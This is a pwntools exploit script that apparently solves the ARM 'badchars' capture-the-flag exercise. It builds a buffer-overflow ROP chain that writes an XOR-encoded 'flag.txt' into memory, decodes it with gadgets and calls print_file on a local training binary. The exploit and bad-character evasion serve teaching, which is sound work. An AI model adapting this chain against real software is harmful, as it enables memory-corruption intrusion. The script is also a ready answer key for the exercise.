from pwn import *

data = 0x00021024 # rw-
print_file = 0x000104b4 # plt
# Using sub r6 to underflow r1
sub_str = 0x000105f4 # sub r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}
pop_r5_r6 = 0x00010614 # pop {r5, r6, pc}
ldr_eor_str = 0x00010618 # ldr r1, [r5] ; eor r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}
pop_r0 = 0x000105fc # pop {r0, pc}
key = 0x2
flag = bytes([ i^key for i in b"flag.txt" ])
flag_1 = 0xffffffff + 1 - int.from_bytes(flag[:4], "little")
flag_2 = int.from_bytes(flag[:4], "little") + (0xffffffff + 1 - int.from_bytes(flag[4:], "little"))

# Writing encoded filename in memory
payload = b"".join([
    b"A"*(32+12),
    p32(pop_r5_r6),
    p32(data),
    p32(flag_1),
    p32(sub_str),
    b"B"*4,
    p32(pop_r5_r6),
    p32(data+4),
    p32(flag_2),
    p32(sub_str),
    b"C"*4,
])

# Decoding filename
for i in range(len(flag)):
    payload += b"".join([
        p32(pop_r5_r6),
        p32(data+i),
        p32(key),
        p32(ldr_eor_str),
        b"D"*4,
    ])

# Calling print_file
payload += b"".join([
    p32(pop_r0),
    p32(data),
    p32(print_file),
])

#p = process(["qemu-arm", "-g", "1234", "./badchars_armv5"])
p = process("./badchars_armv5")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
